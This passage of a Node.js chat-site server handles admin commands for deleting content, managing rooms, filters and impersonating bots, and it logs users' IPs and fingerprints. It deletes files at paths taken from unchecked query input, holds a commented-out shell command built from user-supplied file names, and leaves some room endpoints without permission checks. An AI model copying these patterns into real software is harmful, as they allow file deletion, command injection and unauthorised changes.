                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }
            });
          } else if (req.query.event == "storyy") {
            StoryRepo.deletealll().then((ginevieve) => {
              ginevieve &&
                (res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم مسح الستوري",
                  })
                ),
                io.emit("msg", {
                  cmd: "olk",
                  data: {},
                }),
                savestate({
                  state: "حذف الستوري",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                }));
            });
          } else if (req.query.event == "adoyat") {
            UsersRepo.dtl().then((ginevieve) => {
              ginevieve &&
                (res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم مسح جميع العضويات",
                  })
                ),
                io.emit("msg", {
                  cmd: "nokk",
                  data: {},
                }),
                savestate({
                  state: "حذف جميع العضويات",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                }));
            });
          } else if (req.query.event == "bandd") {
            BandRepo.deleteallbandd().then((ginevieve) => {
              ginevieve &&
                (res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم فك جميع المحظورين",
                  })
                ),
                io.emit("msg", {
                  cmd: "nokkk",
                  data: {},
                }),
                savestate({
                  state: "فك حظر الجميع",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                }));
            });
          } else if (req.query.event == "ahtsar") {
            CutsRepo.deleteallsitinng().then((ginevieve) => {
              ginevieve &&
                (res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم حذف جميع الاختصارات",
                  })
                ),
                io.emit("msg", {
                  cmd: "nokkk",
                  data: {},
                }),
                savestate({
                  state: "حذف جميع الاختصارات",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                }));
            });
          } else if (req.query.event == "mesgss") {
            IntroRepo.deleteallresala().then((ginevieve) => {
              ginevieve &&
                (res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم حذف جميع الرسائل والترحيب",
                  })
                ),
                io.emit("msg", {
                  cmd: "nokkk",
                  data: {},
                }),
                savestate({
                  state: "حذف جميع الرسائل والترحيب",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                }));
            });
          } else if (req.query["event"] == "actions") {
            StateRepo.deleteall().then((isdf) => {
              if (isdf) {
                res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم مسح جميع سجلات الحالات",
                  })
                );
                savestate({
                  state: "حذف سجل الحالات",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }
            });
            // }else if(req.query['event'] == ''){
          }
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "sitesave") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          SettingRepo.updateSite({
            site: req.query.data,
            id: req.query.domin,
          }).then((isdone) => {
            if (isdone) {
              SettingRepo.getById(req.query.domin || 1).then((isdres) => {
                if (isdres) {
                  SiteSetting = JSON.parse(isdres.site);
                  walllikes = JSON.parse(SiteSetting["walllikes"]);
                  if (isdres.emo || isdres.dro3 || isdres.sico) {
                    emos = JSON.parse(isdres.emo);
                    dro3s = JSON.parse(isdres.dro3);
                    sicos = JSON.parse(isdres.sico);
                  }
                  savestate({
                    state: "إعدادت الموقع",
                    topic: data.username,
                    topic1: "حفظ",
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  res.end(JSON.stringify({ err: false, msg: true }));
                }
              });
            }
          });
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "fps") {
        LogsRepo.createTable().then((table) => {
          if (table) {
            if (req.query.q.trim()) {
              LogsRepo.getBy({
                ser: req.query.q.trim(),
                ip: req.query.q.trim(),
                device: req.query.q.trim(),
                topic: req.query.q.trim(),
                username: req.query.q.trim(),
              }).then((isdata) => {
                if (isdata) {
                  res.end(JSON.stringify(isdata));
                }
              });
            } else {
              LogsRepo.getAll().then((isdata) => {
                if (isdata) {
                  res.end(JSON.stringify(isdata));
                }
              });
            }
          }
        });
      } else if (req.query.cmd == "del_ico") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          fs.unlink(
            "uploads/" +
              req.query.pid.split("/")[1] +
              "/" +
              req.query.pid.split("/")[2],
            (err) => {
              if (err) {
                console.error(err);
                return;
              }
            }
          );
          if (req.query.pid.split("/")[1] == "sico") {
            const indexsico = sicos.findIndex(
              (x) => x == req.query.pid.split("/")[2]
            );
            if (indexsico !== -1) {
              sicos.splice(indexsico, 1);
              SettingRepo.updateSico({ sico: JSON.stringify(sicos), id: 1 });
              io.emit("msg", { cmd: "sicos", data: sicos });
              savestate({
                state: "مسح بنر | ايقونه",
                topic: data.topic,
                topic1: data.username,
                room: "",
                ip: data.ip,
                time: new Date().getTime(),
              });
            }
          } else if (req.query.pid.split("/")[1] == "dro3") {
            const indexdro3 = dro3s.findIndex(
              (x) => x == req.query.pid.split("/")[2]
            );
            if (indexdro3 !== -1) {
              dro3s.splice(indexdro3, 1);
              SettingRepo.updateDro3({ dro3: JSON.stringify(dro3s), id: 1 });
              io.emit("msg", { cmd: "dro3", data: dro3s });
              savestate({
                state: "مسح هدية | ايقونه",
                topic: data.topic,
                topic1: data.username,
                room: "",
                ip: data.ip,
                time: new Date().getTime(),
              });
            }
          } else if (req.query.pid.split("/")[1] == "emo") {
            const indexemo = emos.findIndex(
              (x) => x == req.query.pid.split("/")[2]
            );
            if (indexemo !== -1) {
              emos.splice(indexemo, 1);
              SettingRepo.updateEmo({ emo: JSON.stringify(emos), id: 1 });
              io.emit("msg", { cmd: "emos", data: emos });
              savestate({
                state: "مسح فيس | ايقونه",
                topic: data.topic,
                topic1: data.username,
                room: "",
                ip: data.ip,
                time: new Date().getTime(),
              });
            }
          }
          res.end(JSON.stringify({ err: false, msg: req.query.pid }));
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "bots") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          BotsRepo.getAll().then((bot) => {
            if (bot) {
              res.end(JSON.stringify({ err: false, msg: bot }));
            }
          });
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "chkeduser") {
        if (!ShowPowers[MyCpA].edituser) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        if (typeof req.query["id"] != "string") {
          return;
        }

        UsersRepo.updatedoc({ documentationc: true, id: req.query["id"] }).then(
          (drlg) => {
            if (drlg) {
              UsersRepo.getByUserName(req.query["id"]).then(function (uid) {
                if (uid) {
                  res.end(
                    JSON.stringify({ err: false, msg: "تم التعديل بنجاح" })
                  );
                  savestate({
                    state: "توثيق عضويه",
                    topic: data.topic,
                    topic1: uid.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                }
              });
            }
          }
        );
      } else if (req.query.cmd == "sendmsgbot") {
        if (
          typeof req.query["id"] != "string" ||
          typeof req.query["msg"] != "string"
        ) {
          return;
        }
        if (data.power == "chatmaster" || data.power == "Hide") {
          if (UserInfo[req.query["id"]]) {
            io.to(UserInfo[req.query["id"]].idroom).emit("msg", {
              cmd: "msg",
              data: {
                bg: UserInfo[req.query["id"]].bg,
                mi: stringGen(10),
                mcol: UserInfo[req.query["id"]].mcol,
                uid: UserInfo[req.query["id"]].id,
                msg: ektisara(req.query["msg"]),
                pic: UserInfo[req.query["id"]].pic,
                topic: UserInfo[req.query["id"]].topic
                  .split("<")
                  .join("&#x3C;"),
                ucol: UserInfo[req.query["id"]].ucol,
              },
            });
            res.end(JSON.stringify({ err: false, msg: "" }));
          }
        }
      } else if (req.query.cmd == "deltbot") {
        if (typeof req.query["id"] != "string") {
          return;
        }
        if (data.power == "chatmaster" || data.power == "Hide") {
          UserDisconnect({ id: req.query["id"], state: 2 });
          BotsRepo.delete(req.query["id"]).then(function (btfl) {
            if (btfl) {
              res.end(JSON.stringify({ err: false, msg: "تم حذف البوت" }));
            }
          });
        }
      } else if (req.query.cmd == "addbots") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          const infobot = JSON.parse(req.query["db"]);
          if (typeof infobot != "object") {
            return;
          }
          const isdos = online.findIndex((x) => x.topic == infobot["nameb"]);
          if (isdos == -1) {
            BotsRepo.create({
              id: stringGen(18),
              ip:
                randomNumber(10, 99) +
                "." +
                randomNumber(10, 999) +
                "." +
                randomNumber(10, 999) +
                "." +
                randomNumber(10, 99),
              msg: infobot["msgbot"],
              pic: infobot["urlpic"] || "pic.png",
              power: infobot["rankbot"] || "",
              country: infobot["countrybot"] || "tn",
              room: infobot["rommbot"] || "",
              stat: infobot["statsbots"] || 0,
              topic: infobot["nameb"].split("<").join("&#x3C;"),
            }).then(function (btts) {
              if (btts) {
                res.end(JSON.stringify({ err: false, msg: "تم انشاء بوت" }));
              }
            });
          } else {
            res.end(
              JSON.stringify({ err: true, msg: "اسم البوت موجود في الدردشة" })
            );
          }
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "enterbot") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          BotsRepo.getById(req.query["id"]).then((isbot) => {
            if (isbot) {
              const isdos = online.findIndex((x) => x.topic == isbot["topic"]);
              if (isdos == -1) {
                EnterBoot({
                  rank: isbot["power"] || "",
                  loginG: false,
                  loginGG: false,
                  loginGG3: false,
                  eva: 0,
                  islogin: "بوت",
                  refr: "*",
                  username: isbot["topic"].split("<").join("&#x3C;"),
                  ucol: "#000000",
                  mcol: "#000000",
                  bg: "#ffffff",
                  rep: 1000,
                  ico: "",
                  islike: [],
                  idreg: "#" + getRandomInt(300, 900),
                  topic: isbot["topic"].split("<").join("&#x3C;"),
                  code: isbot["country"] || "tn",
                  ip: isbot["ip"] || "",
                  lid: stringGen(31),
                  uid: stringGen(22),
                  token: stringGen(10),
                  id: isbot["id"],
                  busy: false,
                  alerts: false,
                  stat: isbot["stat"] || 0,
                  ismuted: false,
                  power: isbot["power"] || "",
                  documents: 0,
                  fp: "Tiger.Host.Is.The.Best.Ever",
                  pic: isbot["pic"] || "pic.png",
                  idroom: isbot["room"] || "",
                  msg: isbot["msg"] || "( عضو جديد )",
                  stealth: false,
                });
                res.end(
                  JSON.stringify({ err: true, msg: "تم إدخال البوت بنجاح" })
                );
              } else {
                UserDisconnect({ id: online[isdos].id, state: 2 });
                res.end(JSON.stringify({ err: true, msg: "تم إخراج البوت" }));
              }
            }
          });
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "logins") {
        if (!ShowPowers[MyCpA].edituser) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        if (!req.query.q.trim()) {
          UsersRepo.getAll().then((isdata) => {
            if (isdata) {
              res.end(JSON.stringify(isdata));
            }
          });
        } else {
          UsersRepo.getBy({
            ip: req.query.q.trim(),
            fp: req.query.q.trim(),
            topic: req.query.q.trim(),
          }).then((isdata) => {
            if (isdata) {
              res.end(JSON.stringify(isdata));
            }
          });
        }
      } else if (req.query.cmd == "actions") {
        StateRepo.createTable().then((table) => {
          if (table) {
            StateRepo.getAll().then((isdata) => {
              if (isdata) {
                res.end(JSON.stringify(isdata));
              }
            });
          }
        });
      } else if (req.query.cmd == "fltr") {
        if (!ShowPowers[MyCpA].flter) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        NotextRepo.createTable().then((table) => {
          if (table) {
            NotextRepo.getAll().then((isdata) => {
              if (isdata) {
                res.end(JSON.stringify(isdata));
              }
            });
          }
        });
      } else if (req.query.cmd == "fltrdel") {
        if (!ShowPowers[MyCpA].flter) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        NotextRepo.delete(req.query.id).then((deldone) => {
          if (deldone) {
            savestate({
              state: "مسح فلتر",
              topic: data.username,
              topic1: req.query.v,
              room: "",
              ip: data.ip,
              time: new Date().getTime(),
            });
            NotextRepo.getAll().then((isres) => {
              if (isres) {
                noletter = isres;
              }
            });
            res.end();
          }
        });
      } else if (req.query.cmd == "fltrit") {
        if (!ShowPowers[MyCpA].flter) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        var isfulter = "";
        if (req.query.path == "bmsgs") {
          isfulter = "إضافة كلمة ممنوعه الى الفلتر";
        } else if (req.query.path == "amsgs") {
          isfulter = "إضافة كلمة مسموحة الى الفلتر";
        } else if (req.query.path == "wmsgs") {
          isfulter = "إضافة كلمة مراقبه الى الفلتر";
        }
        if (req.query.v.includes("*")) {
          return;
        }
        NotextRepo.create({
          type: isfulter,
          path: req.query.path.split("<").join("&#x3C;"),
          v: req.query.v.split("<").join("&#x3C;"),
        }).then((done) => {
          if (done) {
            NotextRepo.getAll().then((isres) => {
              if (isres) {
                noletter = isres;
              }
            });

            savestate({
              state: "إظافة فلتر",
              topic: data.username,
              topic1: req.query.v,
              room: "",
              ip: data.ip,
              time: new Date().getTime(),
            });
            NotextRepo.getById(done.id).then((doneis) => {
              if (doneis) {
                res.end(JSON.stringify(doneis));
              }
            });
          }
        });
      } else if (req.query.cmd == "fltred") {
        if (!ShowPowers[MyCpA].flter) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        HistLetterRepo.createTable().then((table) => {
          if (table) {
            HistLetterRepo.getAll().then((isdata) => {
              if (isdata) {
                res.end(JSON.stringify(isdata));
              }
            });
          }
        });
      } else if (req.query.cmd == "shrt") {
        if (!ShowPowers[MyCpA].shrt) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        CutsRepo.createTable().then((table) => {
          if (table) {
            CutsRepo.getAll().then((isdata) => {
              if (isdata) {
                res.end(JSON.stringify(isdata));
              }
            });
          }
        });
      } else if (req.query.cmd == "shrtadd") {
        if (!ShowPowers[MyCpA].shrt) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        CutsRepo.create({
          text1: req.query.name.split("<").join("&#x3C;"),
          text2: req.query.value.split("<").join("&#x3C;"),
        }).then((done) => {
          if (done) {
            savestate({
              state: "إظافة إختصار",
              topic: data.username,
              topic1: req.query.name,
              room: "",
              ip: data.ip,
              time: new Date().getTime(),
            });
            StartEktisar();
            CutsRepo.getById(done.id).then((doneis) => {
              if (doneis) {
                res.end(JSON.stringify(doneis));
              }
            });
          }
        });
      } else if (req.query.cmd == "shrtdel") {
        if (!ShowPowers[MyCpA].shrt) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        CutsRepo.getById(req.query.id).then((cutr) => {
          if (cutr) {
            savestate({
              state: "مسح إختصار",
              topic: data.username,
              topic1: cutr.text1,
              room: "",
              ip: data.ip,
              time: new Date().getTime(),
            });
            CutsRepo.delete(req.query.id).then((deldone) => {
              if (deldone) {
                res.end();
                StartEktisar();
              }
            });
          }
        });
      } else if (req.query.cmd == "msgs") {
        if (!ShowPowers[MyCpA].msgs) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        IntroRepo.createTable().then((table) => {
          if (table) {
            IntroRepo.getAll().then((isdata) => {
              if (isdata) {
                res.end(JSON.stringify(isdata));
              }
            });
          }
        });
      } else if (req.query.cmd == "msgsit") {
        if (!ShowPowers[MyCpA].msgs) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        IntroRepo.create({
          category: req.query.type,
          adresse: req.query.t.split("<").join("&#x3C;"),
          msg: req.query.m.split("<").join("&#x3C;"),
        }).then((done) => {
          if (done) {
            IntroRepo.getById(done.id).then((doneis) => {
              if (doneis) {
                res.end(JSON.stringify(doneis));
                savestate({
                  state:
                    req.query.type == "d"
                      ? "إظافة رسالة يوميه"
                      : "إظافة رسالة ترحيب",
                  topic: data.topic,
                  topic1: data.username,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }
            });
          }
        });
      } else if (req.query.cmd == "msgsdel") {
        if (!ShowPowers[MyCpA].msgs) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        IntroRepo.delete(req.query.id).then((deldone) => {
          if (deldone) {
            res.end();
            savestate({
              state:
                req.query.type == "d" ? "مسح رسالة يوميه" : "مسح رسالة ترحيب",
              topic: data.topic,
              topic1: data.username,
              room: "",
              ip: data.ip,
              time: new Date().getTime(),
            });
          }
        });
      } else if (req.query.cmd == "hostingr") {
        res.end(JSON.stringify({ err: true, msg: isVPN }));
      } else if (req.query.cmd == "hostnames") {
        HostRepo.getAll().then((host) => {
          if (host) {
            res.end(
              JSON.stringify({ err: true, msg: host, power: data.power })
            );
          }
        });
      } else if (req.query.cmd == "iscondb") {
        if (data.power == "Hide") {
          if (req.query["state"] == 1) {
            fs.unlink("database/" + req.query["data"], (err) => {
              if (err) {
                res.end(
                  JSON.stringify({
                    err: true,
                    msg: "فشلت العملية الرجاء الاعادة في وقت لاحق",
                  })
                );
                return;
              } else {
                res.end(
                  JSON.stringify({ err: true, msg: "تم مسح القاعدة بنجاح" })
                );
              }
            });
          } else if (req.query["state"] == 2) {
            fs.existsSync(
              "database/" + req.query["data"],
              (error, stdout, stderr) => {
                if (error) throw error;
                res.end(
                  JSON.stringify({
                    err: true,
                    msg:
                      req.query["data"] + " تم إسترجاع قاعدة البيانات بناجح ",
                  })
                );
              }
            );
          }
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }

        /*	OwnerRepo.DeleteDatabase();
						setTimeout(function(){
							OwnerRepo.CreateDatabase();
						setTimeout(function(){
cp.exec('mysql -u '+Config.UserDB+' -p '+Config.PassDB+' '+Config.DBDB+' < '+ 'database/' + req.query["data"], (error, stdout, stderr) => {
    if (error) throw error;
                      res.end(JSON.stringify({ err: true, msg: req.query["data"]+" تم إسترجاع قاعدة البيانات بناجح " }));
						setTimeout(function(){
		                process.exit(1);
						},2000);
});
						},1000);
						},1000);
                    }
               
                } else {
                    res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
                }*/
      } else if (req.query.cmd == "rc") {
        res.end(JSON.stringify({ err: true, msg: isrc }));
      } else if (req.query.cmd == "bnr") {
        res.end(JSON.stringify({ err: true, msg: isbannerdone }));
      } else if (req.query.cmd == "bnr1") {
        res.end(JSON.stringify({ err: true, msg: isbannerdone1 }));
      } else if (req.query.cmd == "bnr2") {
        res.end(JSON.stringify({ err: true, msg: isbannerdone2 }));
      } else if (req.query.cmd == "bnr3") {
        res.end(JSON.stringify({ err: true, msg: isbannerdone3 }));
      } else if (req.query.cmd == "hostinge") {
        res.end(JSON.stringify({ err: true, msg: Offline }));
      } else if (req.query.cmd == "maxrep") {
        res.end(JSON.stringify({ err: true, msg: MaxRep }));
      } else if (req.query.cmd == "tvtv") {
        res.end(JSON.stringify({ err: true, msg: IsTV }));
      } else if (req.query.cmd == "mxpr") {
        res.end(JSON.stringify({ err: true, msg: MaxRep }));
      } else if (req.query.cmd == "databaseinfo") {
        var filedb = [];
        fs.readdir("database/", (err, files) => {
          files.forEach((file) => {
            if (file.includes("-")) {
              filedb.push(file);
            }
          });
        });
        setTimeout(function () {
          res.end(JSON.stringify({ err: true, msg: filedb }));
        }, 1000);
      } else if (req.query.cmd == "hosting") {
        UsersRepo.getAll().then((users) => {
          if (users) {
            OwnerRepo.getById(1).then((vus) => {
              if (vus) {
                if (vus["Vistor"]) {
                  var isv = JSON.parse(vus["Vistor"]).length;
                } else {
                  var isv = 0;
                }

                if (vus["Gust"]) {
                  var isg = JSON.parse(vus["Gust"]).length;
                } else {
                  var isg = 0;
                }
                res.end(
                  JSON.stringify({
                    err: true,
                    tf: DataFinish,
                    msg: BarFix,
                    u: users.length - 3,
                    g: isg,
                    v: isv,
                  })
                );
              }
            });
          }
        });
      } else if (req.query.cmd == "rooms") {
        if (!ShowPowers[MyCpA].roomowner) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        RoomsRepo.getAll().then((rooms) => {
          if (rooms) {
            // res.end(JSON.stringify(rooms));
            res.end(
              JSON.stringify({ err: false, data: RoomEnter, msg: rooms })
            );
          }
        });
      } else if (req.query.cmd == "roompass") {
        RoomsRepo.updatePass({
          pass: "",
          needpass: false,
          id: req.query.id,
        }).then((donedel) => {
          if (donedel) {
            RefreshRooms();
            RoomsRepo.getByMId(req.query.id).then((isro) => {
              if (isro) {
                io.emit("msg", { cmd: "room^", data: isro });
                savestate({
                  state: "مسح كلمة سر غرفة",
                  topic: data.topic,
                  topic1: data.username,
                  ip: data.ip,
                  room: RoomGroupByID(req.query.id),
                  time: new Date().getTime(),
                });
              }
            });
            res.end(JSON.stringify({ err: false, msg: "تم مسح كلمة المرور" }));
          }
        });
      } else if (req.query.cmd == "roomspicdel") {
        RoomsRepo.updatePic({ pic: "room.png", id: req.query.id }).then(
          (donedel) => {
            if (donedel) {
              RefreshRooms();
              RoomsRepo.getByMId(req.query.id).then((isro) => {
                if (isro) {
                  io.emit("msg", { cmd: "room^", data: isro });
                  savestate({
                    state: "مسح صورة غرفة",
                    topic: data.topic,
                    topic1: data.username,
                    ip: data.ip,
                    room: RoomGroupByID(req.query.id),
                    time: new Date().getTime(),
                  });
                }
              });
              res.end(JSON.stringify({ err: false, msg: "" }));
            }
          }
        );
      } else if (req.query.cmd == "roomspic") {
        RoomsRepo.updatePic({ pic: req.query.pic, id: req.query.id }).then(
          (doneup) => {
            if (doneup) {
              RefreshRooms();
              RoomsRepo.getByMId(req.query.id).then((isro) => {
                if (isro) {
                  io.emit("msg", { cmd: "room^", data: isro });
                  savestate({
                    state: "تعديل صورة غرفة",
                    topic: data.topic,
                    topic1: data.username,
                    ip: data.ip,
                    room: RoomGroupByID(req.query.id),
                    time: new Date().getTime(),
                  });
                }
              });

              res.end(JSON.stringify({ err: false, msg: req.query.pic }));
            }
          }
        );
      } else if (req.query.cmd == "roomsver") {
        if (!ShowPowers[MyCpA].createroom) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        RoomsRepo.getByMId(req.query.id).then((isroo) => {
          if (isroo) {
            OwnerRepo.updateRoom({ room: req.query.id, id: 1 });
            res.end(
              JSON.stringify({ err: false, msg: "تم تحديد الغرفة بنجاح" })
            );
            OwnerList();
          }
        });
      } else if (req.query.cmd == "roomsdel") {
        if (req.query["id"] == "D8D8A9A9C0") {
          res.end(
            JSON.stringify({ err: true, msg: "لا يمكنك حذف هذه الغرفة" })
          );
        } else {
          RoomsRepo.delete(req.query.id).then((deldone) => {
            if (deldone) {
              savestate({
                state: "مسح غرفة",
                topic: data.topic,
                topic1: data.username,
                ip: data.ip,
                room: RoomGroupByID(req.query.id),
                time: new Date().getTime(),
              });
              RefreshRooms();
              io.emit("msg", { cmd: "room-", data: req.query.id });
              io.to(req.query.id).emit("msg", {
                cmd: "msg",
                data: {
                  bg: data.bg,
                  class: "hmsg",
                  id: data.id,
                  topic: data.topic,
                  msg: "( تم حذف الغرفة الحاليه )",
                  roomid: req.query.id,
                  pic: data.pic,
                  uid: data.id,
                },
              });
              res.end(
                JSON.stringify({ err: false, msg: "تم مسح الغرفة بنجاح" })
              );
            }
          });
        }
      } else if (req.query.cmd == "owner") {
        if (!ShowPowers[MyCpA].owner) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        SettingRepo.getById(req.query.domin || 1).then((stg) => {
          if (stg) {
            var stgs = [stg];
            fs.readFile(
              "uploads/" + JSON.parse(stg.site).siteScript,
              function (err, f) {
                if (f) {
                  var array = f.toString().split("\n");
                  array = JSON.parse(array);
                  SiteRepo.getById(req.query.domin || 1).then(function (own) {
                    if (own) {
                      stgs.push({
                        banner: own.banner,
                        pmpic: own.pmpic,
                        prvpic: own.prvpic,
                        prv2pic: own.prv2pic,
                        prv3pic: own.prv3pic,
                        storpic: own.storpic,
                        finish: DataFinish,
                        logo: own.logo,
                        name: array.name,
                        title: array.title,
                        settdescription: array.settdescription,
                        settscr: array.settscr,
                        settkeywords: array.settkeywords,
                      });
                      res.end(JSON.stringify(stgs));
                    }
                  });
                }
              }
            );
          }
        });
      }
    } else {
      res.end(JSON.stringify({ err: true, msg: "لا تمتلك صلاحيات" }));
    }
  });
});

app.get("/cp/token=*", function (req, res, next) {
  UsersRepo.getByToken(req.params[0]).then(function (data) {
    if (data && VerAdminPanel(data.power)) {
      res.sendFile(path.join(__dirname + "/public/cp.html"));
    } else {
      res.set("Content-Type", "text/html");
      res.write("<h4>لاتملك صلاحيآت</h4>");
      res.end();
    }
  });
});

app.use(express.static("uploads"));

function savelogin(data) {
  if (data) {
    LogsRepo.createTable().then((table) => {
      if (table) {
        LogsRepo.getByIp({
          ip: data.ip,
          state: data.state,
          topic: data.topic,
          username: data.topic1,
        }).then(function (res) {
          if (res) {
            LogsRepo.updateById({
              time: data.time,
              device: data.device,
              id: res.id,
            });
          } else {
            // if (data.topic1.toLowerCase().trim() != AccountUserName.toLowerCase().trim() || data.topic1.toLowerCase().trim() != AccountUserName.toLowerCase().trim()) {
            LogsRepo.create({
              state: data.state,
              topic: data.topic,
              username: data.topic1,
              ip: data.ip,
              code: data.code,
              device: data.device,
              isin: data.isin,
              time: data.time,
            });
            LogsRepo.getAll().then((datavb) => {
              if (datavb) {
                for (var i = 0; i < datavb.length; i++) {
                  if (i > 150) {
                    LogsRepo.delete(datavb[i].id);
                  }
                }
              }
            });
            // }
          }
        });
      }
    });
  }
}

function save_names(data) {
  if (data) {
    NamesRepo.createTable().then((table) => {
      if (table) {
        NamesRepo.getByIp({
          ip: data.ip,
          fp: data.fp,
          topic: data.topic,
          username: data.username,
        }).then((res) => {
          if (res) {
          } else {
            NamesRepo.create({
              iduser: data.iduser,
              fp: data.fp,
              ip: data.ip,
              ip: data.ip,
              topic: data.topic,
              username: data.username,
            });
          }
        });
      }
    });
  }
}

function isMuted(data) {
  const ism = UserMuted.findIndex((x) => x == data);
  if (ism != -1) {
    return true;
  } else {
    return false;
  }
}

function isBandRoom(data) {
  if (data) {
    const ism = BandRoom.findIndex(
      (x) => x.user == data.user && x.room == data.room
    );
    if (ism != -1) {
      return true;
    } else {
      return false;
    }
  }
}

var users = {};
var istik;

function isgusts(data) {
  const isg = online.findIndex((x) => x.id == data && x.s != null);
  if (isg != -1) {
    return true;
  } else {
    return false;
  }
}

function EnterBoot(data) {
  if (data) {
    UserInfo[data.id] = {
      ucol: data.ucol,
      mcol: data.mcol,
      tikroom: 0,
      tikmsg: 0,
      tiktok: 0,
      offline: false,
      isload: false,
      istalk: false,
      ismsg: false,
      logout: false,
      islogin: data.islogin,
      bg: data.bg,
      rep: data.rep,
      ico: data.ico,
      evaluation: data.eva,
      pointsG: data.eva,
      username: data.username,
      islike: data.islike,
      discard: [],
      rank: data.rank,
      idreg: data.idreg,
      topic: data.topic,
      code: data.code,
      location: data.location,
      ip: data.ip,
      id: data.id,
      uid: data.uid,
      lid: data.lid,
      msg: data.msg,
      token: data.token,
      documents: data.documents,
      busy: data.busy,
      alerts: data.alerts,
      ismuted: data.ismuted,
      stealth: data.stealth,
      fp: data.fp,
      pic: data.pic,
      idroom: data.idroom,
    };

    var isenter = UserEntre.findIndex((x) => x == data.id);
    if (isenter == -1) {
      UserEntre.push(data.id);
    }

    const index0 = online.findIndex((x) => x.id == data.id);
    if (index0 == -1) {
      online.push({
        bg: data.bg,
        co: data.code,
        evaluation: data.eva,
        pointsG: data.eva,
        ico: data.ico,
        id: data.id,
        // username: data.username.split("<").join("&#x3C;"),
        idreg: data.idreg,
        lid: data.lid,
        mcol: data.mcol,
        mscol: data.mscol,
        im1: data.im1,
        im2: data.im2,
        im3: data.im3,
        msg: data.msg.split("<").join("&#x3C;"),
        meiut: data.ismuted,
        power: data.power,
        rep: data.rep,
        islogin: data.islogin,
        pic: data.pic,
        time: null,
        istolk: false,
        roomid: data.idroom,
        stat: data.stat,
        topic: data.topic.split("<").join("&#x3C;"),
        ucol: data.ucol,
      });

      io.emit("msg", {
        cmd: "u+",
        data: {
          bg: data.bg,
          co: data.code,
          // username: data.username.split("<").join("&#x3C;"),
          evaluation: data.eva,
          pointsG: data.eva,
          ico: data.ico || "",
          id: data.id,
          istolk: false,
          idreg: data.idreg,
          lid: data.lid,
          mcol: data.mcol,
          mscol: data.mscol,
          msg: data.msg.split("<").join("&#x3C;"),
          power: data.power,
          rep: data.rep,
          pic: data.pic,
          im1: data.im1,
          im2: data.im2,
          im3: data.im3,
          time: null,
          meiut: data.ismuted,
          roomid: data.idroom,
          stat: data.stat,
          topic: data.topic.split("<").join("&#x3C;"),
          ucol: data.ucol,
        },
      });
    }
    const index = roomslists.findIndex((x) => x.id == data.idroom);
    if (index != -1) {
      io.to(data.idroom).emit("msg", {
        cmd: "msg",
        data: {
          bg: "none",
          class: "hmsg",
          topic: UserInfo[data.id].topic,
          msg:
            "هذا المستخدم انضم الى" +
            '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
            roomslists[index].id +
            "')\">" +
            roomslists[index].topic +
            "</div>",
          roomid: data.idroom,
          pic: UserInfo[data.id].pic,
          im2: UserInfo[data.id].im2,
          uid: data.id,
        },
      });
    }
    io.emit("msg", { cmd: "ur", data: [data.id, data.idroom] });
  }
}

configureSocket(io);

